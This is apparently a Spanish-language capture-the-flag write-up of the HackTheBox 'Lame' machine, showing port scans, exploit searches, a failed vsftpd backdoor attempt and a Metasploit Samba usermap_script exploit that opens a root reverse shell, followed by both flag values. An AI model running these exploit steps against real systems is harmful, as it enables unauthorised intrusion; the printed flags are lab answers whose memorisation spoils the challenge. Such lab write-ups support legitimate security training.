# Lame

Plataforma: HackTheBox
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 25 de enero de 2025 21:13
IP: 10.10.10.3

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Que maquina es

```bash
whichSystem.py 10.10.10.3

	10.10.10.3 (ttl -> 63): Linux
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.3 -oG targeted

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p21,22,139,445,3632 -sCV 10.10.10.3 -oN targeted

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h30m19s, deviation: 3h32m08s, median: 18s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-01-26T10:03:49-05:00
|_smb2-time: Protocol negotiation failed (SMB2)

```

- **Identificación de vulnerabilidades**
    - 21/tcp   open  ftp         vsftpd 2.3.4
    - 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
    - 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    - 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
    - 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

- **Enumeramos el puerto 21**
    
    Buscamos vulnerabilidades para la version vsftpd 2.3.4
    
    ```bash
    searchsploit vsftpd 2.3.4
    
    vsftpd 2.3.4 - Backdoor Command Execution                                                                                                               | unix/remote/49757.py
    vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                  | unix/remote/17491.rb
    
    ```
    
    Hay un exploit para metasploit. Lo probamos en la Explotacion 1
    
- **Enumeramos el puerto 445**
    
    Buscamos si hay vulnerabilidades para el servidor samba 3.0.20
    
    ```bash
    searchsploit samba 3.0.20
    Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                        | unix/remote/16320.rb
    ```
    
    Encontramos uno para matesaploit
    
    Lo probamos en la Explotación 2
    

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

```bash
msfconsole >
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)

Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Tras la explotación vemos que no ha funcionado.

### Explotación 2

```bash
msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

msf6 > use 0
msf6 > show options
msf6 > set RHOST 10.10.10.3
msf6 > set LHOST 10.10.16.13
msf6 > run

[*] Started reverse TCP handler on 10.10.16.13:4444 
[*] Command shell session 1 opened (10.10.16.13:4444 -> 10.10.10.3:39492) at 2025-01-26 16:23:42 +0100
shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
back
root@lame:/# ls
```

Encontramos las dos flags en :

- /home/makis:
    
    ```bash
    root@lame:/home/makis# cat user.txt
    cat user.txt
    2ab71489edb8daf29c986bec0ee662ad
    ```
    
- /root
    
    ```bash
    root@lame:/root# cat root.txt
    cat root.txt
    d7589c76e629453b1588bce4ee7f01af
    ```
    

## Conclusión

<aside>
💡 Maquina fácil sin escalada

</aside>